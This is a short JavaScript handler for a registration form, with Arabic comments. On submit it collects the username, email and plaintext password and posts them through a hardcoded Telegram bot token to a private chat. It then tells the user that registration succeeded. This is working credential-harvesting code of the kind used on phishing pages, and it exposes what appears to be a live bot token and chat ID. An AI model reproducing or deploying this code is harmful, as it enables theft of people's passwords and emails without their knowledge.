document.getElementById("register-form").addEventListener("submit", function(event) {
    event.preventDefault(); // يمنع إعادة تحميل الصفحة
    
    let username = document.getElementById("username").value;
    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;

    let botToken = "8196459609:AAFFRJTY7XJ8OSVfEIVT76hf6uRiM4byJ1Y"; // ضع توكن البوت هنا
    let chatId = "7302541527"; // ضع رقم الشات هنا
    let message = `🔹 مستخدم جديد 🔹\n👤 الاسم: ${username}\n📧 البريد الإلكتروني: ${email}\n🔑 كلمة المرور: ${password}`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            alert("تم التسجيل بنجاح!");
            window.location.href = "index.html"; // تغيير الصفحة بعد النجاح
        } else {
            alert("حدث خطأ أثناء التسجيل. حاول مرة أخرى.");
        }
    })
    .catch(error => {
        console.error("خطأ:", error);
        alert("تعذر الاتصال بالسيرفر.");
    });
});
